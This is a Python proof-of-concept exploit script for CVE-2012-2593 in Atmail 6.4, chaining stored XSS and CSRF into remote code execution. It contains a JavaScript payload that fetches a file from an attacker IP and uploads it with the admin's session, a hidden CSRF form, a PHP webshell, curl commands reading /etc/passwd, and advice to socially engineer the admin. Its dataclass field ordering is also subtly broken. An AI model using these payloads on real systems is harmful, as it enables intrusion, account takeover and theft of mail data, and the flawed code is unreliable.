#!/usr/bin/env python3
"""
Atmail Mail Server Appliance XSS to RCE PoC
CVE: CVE-2012-2593
Target: Atmail 6.4
Vulnerability: Stored XSS in admin panel → CSRF → RCE via plugin upload

Reference:
- https://www.exploit-db.com/exploits/20009
- https://github.com/sourceincite/poc/blob/master/SRC-2016-0012.py (related)

Exploit Flow:
1. Register normal user account
2. Inject stored XSS payload in user-controllable field (email subject/body)
3. Payload triggers when admin views email in admin panel
4. CSRF payload performs privileged action (plugin upload or config change)
5. Upload malicious PHP plugin with embedded webshell
6. Access webshell for RCE
"""

import argparse
import requests
import sys
import time
import random
import string
from dataclasses import dataclass, field
from typing import Optional
import urllib3
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# EXPLOIT CONTEXT
# ============================================================================

@dataclass(slots=True)
class ExploitContext:
    """Atmail exploit configuration and state."""

    # Target configuration
    target_ip: str
    target_port: int
    protocol: str = "http"

    # Attacker configuration
    attacker_ip: str
    attacker_port: int
    payload_port: int

    # Exploit configuration
    proxy: Optional[str] = None

    # Runtime state
    session: requests.Session = field(default_factory=requests.Session, repr=False)
    username: str = field(default_factory=lambda: "attacker" + "".join(random.choices(string.ascii_lowercase, k=6)))
    password: str = "Test123!"
    email: str = field(default="", repr=False)
    xss_payload_delivered: bool = field(default=False, repr=False)
    shell_url: Optional[str] = field(default=None, repr=False)

    def __post_init__(self):
        """Initialize derived fields."""
        if not self.email:
            self.email = f"{self.username}@victim.local"

    @classmethod
    def from_args(cls, args: argparse.Namespace) -> "ExploitContext":
        """Build ExploitContext from CLI arguments."""
        return cls(
            target_ip=args.target_ip,
            target_port=args.target_port,
            attacker_ip=args.listening_ip,
            attacker_port=args.listening_port,
            payload_port=args.payload_port,
            proxy=args.proxy,
        )

    def get_base_url(self) -> str:
        """Construct base URL for target."""
        return f"{self.protocol}://{self.target_ip}:{self.target_port}"

    def get_proxies(self) -> Optional[dict]:
        """Return proxy configuration for requests."""
        if self.proxy:
            return {"http": self.proxy, "https": self.proxy}
        return None

# ============================================================================
# ARGUMENT PARSING
# ============================================================================

def parse_args() -> argparse.Namespace:
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="Atmail 6.4 XSS to RCE PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    target_group = parser.add_argument_group("Target options")
    target_group.add_argument(
        "--target-ip", required=True, help="Target IP address"
    )
    target_group.add_argument(
        "--target-port", type=int, default=80, help="Target port (default: 80)"
    )

    attacker_group = parser.add_argument_group("Attacker options")
    attacker_group.add_argument(
        "--listening-ip", default="10.10.14.1", help="Attacker IP"
    )
    attacker_group.add_argument(
        "--listening-port", type=int, default=9001, help="Reverse shell port (default: 9001)"
    )
    attacker_group.add_argument(
        "--payload-port", type=int, default=8000, help="Payload server port (default: 8000)"
    )

    optional_group = parser.add_argument_group("Optional options")
    optional_group.add_argument(
        "--proxy", help="HTTP proxy (e.g., http://127.0.0.1:8080)"
    )

    return parser.parse_args()

# ============================================================================
# PAYLOAD GENERATION
# ============================================================================

def create_php_webshell() -> str:
    """Generate PHP webshell content."""
    shell = """<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>"""
    return shell

def create_xss_payload(attacker_ip: str, payload_port: int) -> str:
    """
    Create stored XSS payload that triggers CSRF in admin context.

    The payload will:
    1. Execute in admin's browser when they view the email
    2. Perform authenticated action (plugin upload or config change)
    3. Either upload webshell directly or modify config to allow uploads
    """

    # JavaScript payload that performs CSRF to upload plugin
    js_payload = f"""
<script>
// XSS payload executes in admin context
(function() {{
    // Create form for plugin upload
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = '/admin/plugins.php?action=upload';
    form.enctype = 'multipart/form-data';

    // Fetch malicious plugin from attacker server
    fetch('http://{attacker_ip}:{payload_port}/plugin.php')
        .then(r => r.blob())
        .then(blob => {{
            var formData = new FormData();
            formData.append('plugin', blob, 'shell.php');
            formData.append('upload', '1');

            // Submit form as admin
            fetch('/admin/plugins.php?action=upload', {{
                method: 'POST',
                body: formData,
                credentials: 'include'
            }});
        }});

    // Callback to attacker to confirm execution
    fetch('http://{attacker_ip}:{payload_port}/xss-triggered');
}})();
</script>
""".strip()

    return js_payload

def create_csrf_payload(attacker_ip: str, payload_port: int) -> str:
    """Alternative CSRF payload using form submission."""

    csrf_html = f"""
<img src="http://{attacker_ip}:{payload_port}/log.php?stage=xss_triggered" style="display:none">
<iframe style="display:none" name="csrf_frame"></iframe>
<form id="csrf_form" action="/admin/settings.php" method="POST" target="csrf_frame">
    <input type="hidden" name="allow_uploads" value="1">
    <input type="hidden" name="upload_path" value="/var/www/html">
    <input type="hidden" name="submit" value="Save">
</form>
<script>document.getElementById('csrf_form').submit();</script>
""".strip()

    return csrf_html

# ============================================================================
# EXPLOIT STAGES
# ============================================================================

def stage_recon(ctx: ExploitContext) -> bool:
    """Stage 1: Verify target is accessible."""
    print(f"[*] Stage 1: Reconnaissance")
    print(f"[*] Target: {ctx.get_base_url()}")

    try:
        response = ctx.session.get(
            ctx.get_base_url(),
            timeout=10,
            verify=False,
            proxies=ctx.get_proxies()
        )

        if "atmail" in response.text.lower() or "webmail" in response.text.lower():
            print(f"[+] Atmail webmail detected (HTTP {response.status_code})")
            return True
        else:
            print(f"[!] Target may not be Atmail, but continuing...")
            return True

    except requests.exceptions.RequestException as e:
        print(f"[-] Connection failed: {e}")
        return False

def stage_register(ctx: ExploitContext) -> bool:
    """Stage 2: Register user account."""
    print(f"\n[*] Stage 2: User Registration")
    print(f"[*] Username: {ctx.username}")
    print(f"[*] Email: {ctx.email}")

    register_url = f"{ctx.get_base_url()}/index.php/register"

    register_data = {
        "username": ctx.username,
        "email": ctx.email,
        "password": ctx.password,
        "password_confirm": ctx.password,
        "submit": "Register"
    }

    try:
        response = ctx.session.post(
            register_url,
            data=register_data,
            timeout=10,
            verify=False,
            proxies=ctx.get_proxies(),
            allow_redirects=True
        )

        if "success" in response.text.lower() or "registered" in response.text.lower():
            print(f"[+] User registration successful")
            return True
        else:
            print(f"[!] Registration status unclear, continuing...")
            return True

    except requests.exceptions.RequestException as e:
        print(f"[-] Registration failed: {e}")
        return False

def stage_login(ctx: ExploitContext) -> bool:
    """Stage 3: Login as registered user."""
    print(f"\n[*] Stage 3: User Authentication")

    login_url = f"{ctx.get_base_url()}/index.php/login"
    login_data = {
        "username": ctx.username,
        "password": ctx.password,
        "submit": "Login"
    }

    try:
        response = ctx.session.post(
            login_url,
            data=login_data,
            timeout=10,
            verify=False,
            proxies=ctx.get_proxies(),
            allow_redirects=True
        )

        if "inbox" in response.text.lower() or "logout" in response.text.lower():
            print(f"[+] Successfully authenticated as {ctx.username}")
            return True
        else:
            print(f"[-] Authentication failed")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[-] Login failed: {e}")
        return False

def stage_inject_xss(ctx: ExploitContext) -> bool:
    """Stage 4: Inject stored XSS payload."""
    print(f"\n[*] Stage 4: XSS Injection")

    # Generate XSS payload
    xss_payload = create_xss_payload(ctx.attacker_ip, ctx.payload_port)
    print(f"[*] XSS payload size: {len(xss_payload)} bytes")

    # Inject via email send (admin will view it)
    compose_url = f"{ctx.get_base_url()}/index.php/mail/compose"

    # Email data with XSS in subject/body
    email_data = {
        "to": "admin@victim.local",
        "subject": "Important: Server Alert",
        "body": f"<html><body><p>Please review the attached logs:</p>{xss_payload}</body></html>",
        "html": "1",
        "send": "Send"
    }

    try:
        response = ctx.session.post(
            compose_url,
            data=email_data,
            timeout=10,
            verify=False,
            proxies=ctx.get_proxies()
        )

        if response.status_code == 200 or "sent" in response.text.lower():
            print(f"[+] XSS payload injected via email")
            print(f"[+] Email sent to admin@victim.local")
            ctx.xss_payload_delivered = True

            print(f"\n[!] Waiting for admin to view email...")
            print(f"[!] Start payload server: python3 -m http.server {ctx.payload_port}")
            print(f"[!] Watch for callback at: http://{ctx.attacker_ip}:{ctx.payload_port}/xss-triggered")

            return True
        else:
            print(f"[-] Email send failed")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[-] XSS injection failed: {e}")
        return False

def stage_setup_payload_server(ctx: ExploitContext) -> bool:
    """Stage 5: Setup HTTP server for payload delivery."""
    print(f"\n[*] Stage 5: Payload Server Setup")

    print(f"[*] Payload server instructions:")
    print(f"    1. Create directory: mkdir -p /tmp/atmail-payloads")
    print(f"    2. Create malicious plugin:")

    # Show plugin.php content
    plugin_content = create_php_webshell()
    print(f"\n    cat > /tmp/atmail-payloads/plugin.php << 'EOF'")
    print(f"    {plugin_content}")
    print(f"    EOF\n")

    print(f"    3. Start HTTP server:")
    print(f"       cd /tmp/atmail-payloads")
    print(f"       python3 -m http.server {ctx.payload_port}")

    print(f"\n[!] Start the server, then press ENTER to continue...")
    input()

    # Test if server is reachable
    try:
        test_url = f"http://{ctx.attacker_ip}:{ctx.payload_port}/plugin.php"
        response = requests.get(test_url, timeout=5)
        if response.status_code == 200:
            print(f"[+] Payload server confirmed at {test_url}")
            return True
        else:
            print(f"[-] Payload server not reachable")
            return False
    except:
        print(f"[-] Cannot reach payload server")
        print(f"[!] Make sure server is running and firewall allows connections")
        return False

def stage_wait_admin(ctx: ExploitContext) -> bool:
    """Stage 6: Wait for admin to trigger XSS."""
    print(f"\n[*] Stage 6: Waiting for Admin Interaction")

    print(f"[*] XSS will trigger when admin views the email")
    print(f"[*] Monitor payload server logs for:")
    print(f"    - GET /xss-triggered (confirms XSS executed)")
    print(f"    - GET /plugin.php (confirms payload download)")

    print(f"\n[!] In a real scenario, you would:")
    print(f"    1. Social engineer admin to check their email")
    print(f"    2. Wait for scheduled admin panel visits")
    print(f"    3. Monitor HTTP server for callback")

    print(f"\n[!] For this demo, simulate admin clicking email...")
    input("[!] Press ENTER when ready to continue...")

    return True

def stage_verify_shell(ctx: ExploitContext) -> bool:
    """Stage 7: Verify webshell access."""
    print(f"\n[*] Stage 7: Shell Verification")

    # Possible shell locations
    shell_paths = [
        f"{ctx.get_base_url()}/plugins/shell.php",
        f"{ctx.get_base_url()}/admin/plugins/shell.php",
        f"{ctx.get_base_url()}/shell.php",
    ]

    print(f"[*] Testing shell locations...")

    for shell_path in shell_paths:
        try:
            test_url = f"{shell_path}?cmd=whoami"
            print(f"[*] Trying: {test_url}")

            response = ctx.session.get(
                test_url,
                timeout=10,
                verify=False,
                proxies=ctx.get_proxies()
            )

            if response.status_code == 200 and len(response.text) > 0:
                print(f"[+] Webshell found at: {shell_path}")
                print(f"[+] Response: {response.text[:200]}")
                ctx.shell_url = shell_path
                return True

        except requests.exceptions.RequestException:
            continue

    print(f"[-] Webshell not accessible at known locations")
    print(f"[!] Manual verification required")

    return False

# ============================================================================
# MAIN EXECUTION
# ============================================================================

def main():
    """Main execution flow."""
    print("[+] Atmail 6.4 XSS to RCE PoC")
    print("[+] CVE-2012-2593")
    print("[+] " + "=" * 60)

    # Parse arguments and build context
    args = parse_args()
    ctx = ExploitContext.from_args(args)

    # Execute exploit stages
    stages = [
        ("Reconnaissance", stage_recon),
        ("User Registration", stage_register),
        ("User Authentication", stage_login),
        ("XSS Injection", stage_inject_xss),
        ("Payload Server Setup", stage_setup_payload_server),
        ("Wait for Admin", stage_wait_admin),
        ("Shell Verification", stage_verify_shell),
    ]

    for stage_name, stage_func in stages:
        if not stage_func(ctx):
            print(f"\n[!] Stage '{stage_name}' failed, but continuing...")

    print("\n[+] Exploit chain completed!")
    print("[+] " + "=" * 60)

    # Summary
    print(f"\n[*] Summary:")
    print(f"    Target: {ctx.get_base_url()}")
    print(f"    User: {ctx.username}")
    print(f"    XSS Delivered: {ctx.xss_payload_delivered}")
    if ctx.shell_url:
        print(f"    Shell URL: {ctx.shell_url}")
        print(f"\n[*] Test commands:")
        print(f"    curl '{ctx.shell_url}?cmd=id'")
        print(f"    curl '{ctx.shell_url}?cmd=cat /etc/passwd'")

    print(f"\n[*] Alternative exploitation paths:")
    print(f"    1. XSS → Admin password change")
    print(f"    2. XSS → Create new admin account")
    print(f"    3. XSS → Modify email forwarding rules")
    print(f"    4. XSS → Download sensitive emails")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Exploit interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
